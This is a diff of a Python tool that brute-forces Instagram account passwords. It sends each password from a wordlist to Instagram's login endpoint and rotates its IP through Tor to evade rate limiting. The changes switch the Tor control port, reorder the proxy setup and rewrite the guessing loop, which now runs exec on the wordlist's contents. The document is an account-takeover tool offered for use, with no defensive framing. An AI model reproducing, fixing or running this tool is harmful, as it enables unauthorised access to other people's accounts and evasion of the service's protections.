@@ -61,7 +61,7 @@ Y = Style.BRIGHT+Fore.YELLOW
 M = Style.BRIGHT+Fore.MAGENTA
 W = Style.BRIGHT+Fore.WHITE
 R = Style.BRIGHT+Fore.RED
-version = "3.0[Stable]"
+version = "4.0 [Stable]"
 def check_d():
     php = os.system("command -v  php > /dev/null")
     if php == 0:
@@ -228,7 +228,7 @@ filepath = os.path.isfile(fileisd)
 
 if filepath == True:
 	filetor = open(fileisd,"w")
-	filetor.writelines("ControlPort 9876\nHTTPTunnelPort 9876")
+	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
 	filetor.close()
 	pass
 else:
@@ -236,7 +236,7 @@ else:
 	os.system(f"mkdir {fileisd[:-5]}")
 	Path(fileisd).touch()
 	filetor = open(fileisd,"a")
-	filetor.writelines("ControlPort 9876\nHTTPTunnelPort 9876")
+	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
 	filetor.close()
 	pass
 import urllib
@@ -626,7 +626,7 @@ from stem import Signal
 
 
 def renew_connection():
-    with Controller.from_port(port=9876) as c:
+    with Controller.from_port(port=9051) as c:
         c.authenticate()
         c.signal(Signal.NEWNYM)
 url = 'https://www.instagram.com/accounts/login/ajax/'
@@ -657,14 +657,14 @@ def signin(password,username):
          'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
          'queryParams': '{}',
          'optIntoOneTap': 'false'}
-    por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
-    ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
-    por2 = {"http": f"http://{ipc}:80", "https": f"https://{ipc}:80"}
+
     print(f"{B}[{G}>{B}]{W} Using Agent : {G}{user}")
     ipc = requests.get("https://httpbin.org/ip").json()['origin']
     print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
     renew_connection()
+    por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
     ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
+    por2 = {"http": f"http://{ipc}:80", "https": f"https://{ipc}:80"}
     print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")
     print(f"{B}[{G}>{B}]{W} Using Proxy : {G}{por2}")
     try:
@@ -701,25 +701,24 @@ def signin(password,username):
 def head(str):
 	print(R+"["+G+">"+R+"] "+C+str)
 def Bruteforce(passlist,username):
-	n_words = len(list(open(passlist, "rb")))
-	head(f"Total passwords to test: {B}"+ str(n_words))
-	print(f"\n{R}║{W} Instagram Id = {G}{username}{W}{R} ║")
-
-	with open(passlist, 'rb') as file:
-	           for line in file:
-	               for word in line.split():
-	                   		print("\n")
-	                   		print(f"{Y}[{W}{line.split().index(word)+1}/{n_words}{Y}]{C} Testing password : {G}"+word.decode())  
-	                   		trial = signin(word.decode(),username)
-	                   		if trial == True:
-	                   			end = timer()
-	                   			print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
-	                   			sys.exit()
-	                   		else:
-	                   			continue
-	end = timer()
-	print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	
-	exit()
+    n_words = len(list(open(passlist, "rb")))
+    head(f"Total passwords to test: {B}"+ str(n_words))
+    print(f"\n{R}║{W} Instagram Id = {G}{username}{W}{R} ║")
+    with open(passlist,"rb") as file:
+        text = str('["'+str(file.read().decode()).replace("\n",'","')[:-2]+']')
+        exec (f"pass_list = {text}")
+        for count,password in enumerate(pass_list):
+            print(f"{Y}[{W}{count+1}/{n_words}{Y}]{C} Testing password : {G}"+password)  
+            trial = signin(password,username)
+            if trial == True:
+                end = timer()
+                print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
+                sys.exit()
+            else:
+                continue
+    end = timer()
+    print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	
+    sys.exit()
 
 def check_igid(username):
     try:
